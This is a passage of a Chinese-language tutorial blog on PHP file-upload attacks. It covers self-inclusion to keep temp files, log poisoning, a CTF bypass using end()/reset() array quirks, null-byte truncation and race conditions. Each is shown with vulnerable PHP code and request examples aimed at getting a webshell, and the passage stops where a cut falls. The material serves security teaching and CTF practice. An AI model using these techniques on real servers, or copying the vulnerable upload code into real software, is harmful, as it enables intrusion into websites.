class="keyword">include</span> (<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<p>然后执行我们的马生成test.phar文件，改后缀为gif，上传。</p>
<p>访问：<code>path/x.php?str=phar://upload_path/test.gif</code>即可</p>
<h5 id="2-php自包含特性"><a href="#2-php自包含特性" class="headerlink" title="2.php自包含特性"></a>2.php自包含特性</h5><p><strong>利用条件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 可控的文件包含点。</span><br><span class="line">2. 目录遍历漏洞。（查看临时文件名）</span><br></pre></td></tr></table></figure>

<p><strong>php文件上传机制</strong></p>
<p>首先先了解一下php的全局数组$_FILES。</p>
<p>官方的解释：</p>
<blockquote>
<p>通过 HTTP POST 方式上传到当前脚本的项目的数组。通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p>
</blockquote>
<p>$_FILES 数组提供了多个内容在文件上传时使用，比较重要的有以下几个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br></pre></td></tr></table></figure>

<ul>
<li>这里的重点就是<code>$_FILES[‘myFile’] [‘tmp_name’]</code>这个变量</li>
</ul>
<p>上传过程中还利用到了一个重要的函数move_uploaded_file()，该方法是将上传的文件移动到新位置，若不加上这一行代码，临时文件在上传周期后就被删除而不会被存储。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(file,newloc)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p>
</blockquote>
<p><strong>利用点</strong></p>
<p>在同一目录下创建两个文件，file_upload.html和upload.php</p>
<ul>
<li><p>file_upload.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/formdata&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lable</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">lable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传前的文件名: &quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;&lt;/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传的临时文件名 : &quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>].<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span>.(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]/<span class="number">1024</span>).<span class="string">&#x27; KB&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>上传以后可以看到，tmp_name的命名规则是php[0-9A-Za-z]{3,4}，而且在上传过程中是被临时存储在&#x2F;tmp目录下（wamp的环境）下。</p>
<p><img src="image-20210214005327863.png" alt="image-20210214005327863"></p>
<p>但是上传完成以后文件会自动被删除，所以在&#x2F;tmp下找不到这个文件</p>
<p>那么我们要如何做到让阻止他将临时文件删除呢？这里就用到了自包含的特性，让存在php文件包含点的文件包含自己，让他产生一个相当于死循环的状态，在包含的过程中我们进行post文件上传操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self_include.php?c=self_include.php</span><br></pre></td></tr></table></figure>

<p>这样就会导致内存溢出，无法正常结束一个php上传周期，这时它会清空自己的内存堆栈，以便从错误中恢复过来，这时对临时文件的删除操作就无法完成，当跳出这个周期后，这个临时文件就以后缀名为tmp的形式保存在&#x2F;tmp目录下。</p>
<p>这时候我们就利用存在包含点的php文件包含这个临时文件就行了。</p>
<p><strong>栗子</strong></p>
<p>测试环境：apache 2.4.9、php版本5.5.12</p>
<p>1.创建两个文件，一个为存在包含点的self_include.php，一个构造的文件上传点</p>
<p>self_include.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>self_include.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;./self_include.php?c=self_include.php&quot;</span>&gt;</span></span><br><span class="line">        File: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.我们让他自包含和文件上传同时进行，这里上传一个phpinfo文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<p>当我们点击提交以后，发现他报错了</p>
<blockquote>
<p>Maximum function nesting level of ‘100’ reached, aborting!</p>
</blockquote>
<p><img src="image-20210214005948539.png" alt="image-20210214005948539"></p>
<p>这是因为在我本地装了xdebug插件，它默认只能trace 100条的信息，所以这里在php.ini的xdebug配置下加上一条：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.max_nesting_level=600</span><br></pre></td></tr></table></figure>

<p>这里测试过大约包含到150次左右程序就会崩溃，就会在tmp目录下生成我们需要的临时文件。</p>
<p>3.重启服务器，此时重新包含一次，提交</p>
<p><img src="image-20210214010026619.png" alt="image-20210214010026619"></p>
<p>可以看到这里生成了两个临时文件，说明这里经过了两个上传周期，之后php守护进程无法处理这种情况就会抛出一个无法访问异常。</p>
<p>4.之后就可以直接利用包含点，愉快的包含我们上传的文件了</p>
<p><img src="image-20210214010112458.png" alt="image-20210214010112458"></p>
<p>而在实战中不一定能知道文件存储路径，所以就需要目录遍历漏洞来找到临时文件的文件名</p>
<p>亦或者是知道路径，但不知道文件名，可以使用burp爆破出文件名。</p>
<p>在Windows下，由于FindFirstFile的特性，在不确定文件后面字符的情况下，可以使用&lt;&lt;结尾来匹配到这个文件，类似于*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/upload/self_include.php?c=../tmp/php&lt;&lt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20210214010543071.png" alt="image-20210214010543071"></p>
<p><strong>举一反三之包含日志</strong></p>
<p>访问一个不存在的文件时，会在服务器下的&#x2F;log&#x2F;access.log进行记录，我们可以通过url写入一个一句话来包含日志文件，从而getshell。</p>
<p>1.首先访问<a target="_blank" rel="noopener" href="http://localhost:9000/">http://localhost:9000/</a><?php phpinfo();?>，记得这里需要使用bp来发包。</p>
<p><img src="image-20210214010723042.png" alt="image-20210214010723042"></p>
<ol start="2">
<li>可以看到access.log文件记录下了我们访问的url。</li>
</ol>
<p><img src="image-20210214010744926.png" alt="image-20210214010744926"></p>
<ol start="3">
<li>进行文件包含，成功包含了phpinfo文件。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/upload/self_include.php?c=../logs/access.log</span><br></pre></td></tr></table></figure>

<p><img src="image-20210214010831567.png" alt="image-20210214010831567"></p>
<p><strong>ctf题目</strong></p>
<p>题目链接：<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/battalion?t=1&r=56951">https://www.ichunqiu.com/battalion?t=1&amp;r=56951</a></p>
<p>writeup链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30123355/article/details/58165038">https://blog.csdn.net/qq_30123355/article/details/58165038</a></p>
<h5 id="3-反序列化上传"><a href="#3-反序列化上传" class="headerlink" title="3.反序列化上传"></a>3.反序列化上传</h5><p>这个也是来源于一道 ctf（jarvisoj phpinfo），题目地址</p>
<p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p>
<p>附上详细的解答：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78430690">https://blog.csdn.net/wy_97/article/details/78430690</a></p>
<h5 id="4-end函数缺陷"><a href="#4-end函数缺陷" class="headerlink" title="4.end函数缺陷"></a>4.end函数缺陷</h5><p><strong>原理</strong></p>
<p>end 函数原本的作用就是返回数组的最后一个元素，reset函数返回数组的第一个值。但是呢</p>
<p>end 函数取到的是给数组的最后一次赋值的那个值，reset 函数取的是第一个给数组赋值的值</p>
<p><img src="image-20210214013307015.png" alt="image-20210214013307015"></p>
<p><strong>栗子</strong></p>
<p>一道网鼎杯第二场的 wafUpload</p>
<p>先看一下 wafUpload 这道题：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">#$sandbox = &#x27;/var/www/html/upload/&#x27; . md5(&quot;phpIsBest&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span></span><br><span class="line"><span class="meta">$sandbox = &#x27;&#x27;;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">#@chdir($sandbox);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if (!empty($_FILES[&#x27;file&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">    #mime check</span></span><br><span class="line"><span class="meta">    if (!in_array($_FILES[&#x27;file&#x27;][&#x27;type&#x27;], [&#x27;image/jpeg&#x27;, &#x27;image/png&#x27;, &#x27;image/gif&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">        die(&#x27;This type is not allowed!&#x27;);</span></span><br><span class="line"><span class="meta">    &#125;else&#123;</span></span><br><span class="line"><span class="meta">        echo &quot;pass 1n&quot;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    #check filename</span></span><br><span class="line"><span class="meta">    $file = empty($_POST[&#x27;filename&#x27;]) ? $_FILES[&#x27;file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;filename&#x27;];</span></span><br><span class="line"><span class="meta">    if (!is_array($file)) &#123;</span></span><br><span class="line"><span class="meta">        $file = explode(&#x27;.&#x27;, strtolower($file));</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">    $ext = end($file);</span></span><br><span class="line"><span class="meta">    if (!in_array($ext, [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">        die(&#x27;This file is not allowed!&#x27;);</span></span><br><span class="line"><span class="meta">    &#125;else&#123;</span></span><br><span class="line"><span class="meta">        echo &quot;pass 2n&quot;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    $filename = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span></span><br><span class="line"><span class="meta">    if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $sandbox . &#x27;/&#x27; . $filename)) &#123;</span></span><br><span class="line"><span class="meta">        echo &#x27;Success!&#x27;;</span></span><br><span class="line"><span class="meta">        echo &#x27;filepath:&#x27; . $sandbox . &#x27;/&#x27; . $filename;</span></span><br><span class="line"><span class="meta">    &#125; else &#123;</span></span><br><span class="line"><span class="meta">        echo &#x27;Failed!&#x27;;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">show_source(__file__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload Your Shell<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p>
<p>根据题目，需要绕过两层判断。</p>
<p>1.第一层，直接抓包修改 MIME 为 image&#x2F;png 就行了。</p>
<p>2.第二层，构造 filename 字段为数组</p>
<p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值（这个就有点类似提示的作用）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = empty($_POST[&#x27;filename&#x27;]) ? $_FILES[&#x27;file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;filename&#x27;];</span><br></pre></td></tr></table></figure>

<p>在本地复现一下，抓包之后看看：</p>
<p>抓包重放之后，如果这里 filename 字段我们填上 shell.php ，根据上面的那句代码的判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &#x27;shell.php&#x27;</span><br></pre></td></tr></table></figure>

<p>如果没有在 filename 字段中填入 shell.php 的话，那么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &#x27;1.php&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="image-20210214014326613.png" alt="image-20210214014326613"></p>
<p>若直接是这样的话，在下面的几句判断中就无法通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!in_array($ext, [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;]))</span><br></pre></td></tr></table></figure>

<p>所以这里想要绕过他的判断直接上传 php 文件的话，只能构造 filename 为数组，通过 end 函数的缺陷来绕过下面的的条件判断。</p>
<p>这里的 end 函数取到了第二个给数组赋值的值，也就是 filename[0] ，reset 函数的值为 filename[1]。这边构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename[1] = php</span><br><span class="line">filename[0] = png</span><br></pre></td></tr></table></figure>

<p>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure>

<p>这里的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file[count($file) - 1]</span><br></pre></td></tr></table></figure>

<p>一定是取到 filename[1]，所以上面给 filename[1] 赋值为 php 的意义就在这里。</p>
<p>最后拼接出了 php.php，就达到了上传 shell 的目的.</p>
<h3 id="5-服务端目录路径校验"><a href="#5-服务端目录路径校验" class="headerlink" title="5.服务端目录路径校验"></a>5.服务端目录路径校验</h3><p><strong>原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过</strong></p>
<p>存在path参数可控，配合<strong>web服务器解析漏洞</strong>上传webshell</p>
<p>00截断：</p>
<p> <code>GET:/upload/1.php%001.jpg</code><br><code>POST:在文件名后burpsuite添加二进制00</code></p>
<p>适用场合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include(require)</span><br><span class="line">file_get_contents</span><br><span class="line">file_exists</span><br><span class="line">所有url中参数可以用%00控制</span><br></pre></td></tr></table></figure>



<h3 id="6-条件竞争"><a href="#6-条件竞争" class="headerlink" title="6.条件竞争"></a>6.条件竞争</h3><p>由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
<p>服务端校验代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success.file path is: &quot;</span>.<span class="variable">$newfile</span>.<span class="string">&quot;\n&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:upload the file type is not allowed，delete the file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
